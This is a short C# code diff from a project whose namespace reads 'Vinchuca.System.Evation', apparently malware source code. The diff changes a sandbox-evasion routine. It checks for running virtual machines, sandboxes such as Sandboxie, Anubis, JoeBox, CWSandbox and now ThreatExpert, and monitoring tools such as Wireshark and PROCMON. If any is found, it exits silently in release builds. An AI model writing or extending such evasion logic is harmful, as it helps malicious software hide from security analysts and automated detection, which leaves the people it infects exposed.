@@ -46,7 +46,7 @@ namespace Vinchuca.System.Evation
             return id == SystemInfo.GetWindowsProductId();
         }
 
-        public static void CheckIfSandboxed()
+        public static void CheckSandboxed()
         {
             var virtualPc  = IsRunning("vpcmap", "vmsrvc", "vmusrvc"); // Virtual PC
             var virtualBox = IsRunning("VBoxService");                 // Virtual Box
@@ -59,9 +59,11 @@ namespace Vinchuca.System.Evation
 
             var tools = IsRunning("NETSTAT", "FILEMON", "PROCMON", "REGMON", "CAIN", "NETMON", "TCPVIEW");
  
-            if(virtualBox || virtualPc || wireshark || sandboxie || anubis || joeBox || cwSandbox || tools)
+            if(virtualBox || virtualPc || wireshark || sandboxie || anubis || joeBox || cwSandbox || tools || threatExpert)
             {
+#if !DEBUG
                 Environment.Exit(0);
+#endif
             }
         }
     }
